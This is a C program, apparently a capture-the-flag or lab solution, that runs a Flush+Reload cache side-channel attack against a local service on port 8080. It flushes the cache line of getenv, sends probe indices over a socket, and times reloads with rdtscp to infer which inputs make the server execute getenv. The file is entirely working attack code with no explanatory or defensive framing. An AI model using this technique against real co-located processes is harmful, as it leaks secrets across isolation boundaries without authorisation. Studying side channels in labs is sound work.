#define _GNU_SOURCE
#include <sched.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SA struct sockaddr

#define PORT 8080
#define IP "0.0.0.0"

#define MAX_VAL 144

#define ulong unsigned long

__attribute__((naked))  void clflush(volatile void *p) {
    asm volatile (  "mfence;"
                    "clflush [rdi];"
                    "mfence;"
                    "ret" :::);
}

__attribute__((naked)) uint64_t time_foo(volatile void *p){
    asm volatile(
        "push rbx;"
        "mfence;"
        "xor rax, rax;"
        "mfence;"
        "rdtscp;"         // before
        "mov rbx, rax;"
        "mov rdi, [rdi];" // RELOAD
        "rdtscp;"         // after
        "mfence;"
        "sub rax, rbx;"   // return after - before
        "pop rbx;"
        "ret;" :::
    );
}

void pseudo_sleep(int it) {
    for (int i = 0; i < it; i++) {

    }
}

int main(void)
{
    int sockfd, connfd;
    struct sockaddr_in servaddr = {0};
    struct sockaddr_in cli = {0};

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(1, &my_set);
    if(sched_setaffinity(0, sizeof(cpu_set_t), &my_set) 
            < 0) {
        perror("sched_setaffinity");
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
    }

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(IP);
    servaddr.sin_port = htons(PORT);

    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) 
        != 0) {
        perror("connect");
    }

    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 500000;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO,
             (const char*)&tv, sizeof(tv));

    for (int i = 120; i < 144; i++) {
        float avg = 0;

        for (int j = 0; j < 0x1000; j++) {
          clflush((ulong)getenv);

          write(sockfd, &i, sizeof(int));
          
          pseudo_sleep(100000);

          int t = time_foo((ulong)getenv);
          avg += t;
        }

        printf("Index: %d, avg: %f \n",
                i, avg / 0x1000);
    }
}
